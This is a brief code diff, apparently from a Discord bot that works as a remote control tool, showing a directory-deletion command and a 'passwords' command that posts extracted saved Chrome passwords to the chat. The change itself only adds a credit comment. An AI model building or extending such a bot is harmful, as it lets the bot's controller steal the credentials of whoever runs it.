@@ -294,8 +294,8 @@ async def rmdir(ctx, directory_path=None):
         await ctx.send(f"Error deleting the directory '{directory_path}': {e}")
 
 
-@bot.command()
-async def passwords(ctx):
+@bot.command() #CREDITS: https://thepythoncode.com/article/extract-chrome-passwords-python
+async def passwords(ctx): 
     await ctx.send(main())
 
 
